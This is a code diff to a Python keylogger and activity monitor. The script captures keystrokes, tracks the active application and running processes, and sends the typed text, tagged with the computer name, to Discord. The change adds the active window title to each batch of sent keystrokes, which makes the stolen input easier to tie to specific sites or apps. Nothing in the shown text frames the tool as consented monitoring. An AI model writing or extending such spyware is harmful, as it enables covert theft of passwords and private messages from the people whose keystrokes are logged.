@@ -28,6 +28,7 @@ keystrokes = ""
 last_keystroke_time = time.time()
 keystroke_lock = threading.Lock()
 current_app = "Unknown"
+current_window = "Unknown"
 
 # Function to format duration
 def format_duration(seconds):
@@ -64,19 +65,19 @@ def get_active_window_title():
 
 # Function to send keystrokes
 def send_keystrokes():
-    global keystrokes, last_keystroke_time, current_app
+    global keystrokes, last_keystroke_time, current_app, current_window
     
     with keystroke_lock:
         if keystrokes.strip():
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            send_to_discord(f"[{timestamp}] [Keystrokes] {PC_NAME} ({current_app}): {keystrokes}")
+            send_to_discord(f"[{timestamp}] [Keystrokes] {PC_NAME} ({current_app} - {current_window}): {keystrokes}")
             keystrokes = ""
     
     last_keystroke_time = time.time()
 
 # Function to log keystrokes
 def log_keystroke(event):
-    global keystrokes, last_activity_time, last_keystroke_time, current_app
+    global keystrokes, last_activity_time, last_keystroke_time, current_app, current_window
     
     last_activity_time = time.time()
     last_keystroke_time = time.time()
@@ -109,7 +110,7 @@ keystroke_thread.start()
 
 # Monitoring loop
 def monitor():
-    global last_logged, active_processes, app_start_times, last_activity_time, last_keystroke_time, current_app
+    global last_logged, active_processes, app_start_times, last_activity_time, last_keystroke_time, current_app, current_window
     
     while True:
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -119,6 +120,7 @@ def monitor():
             continue
         
         current_app = app_name
+        current_window = window_title
         current_processes = {proc.info['name'] for proc in psutil.process_iter(['name'])}
         closed_processes = active_processes - current_processes
 
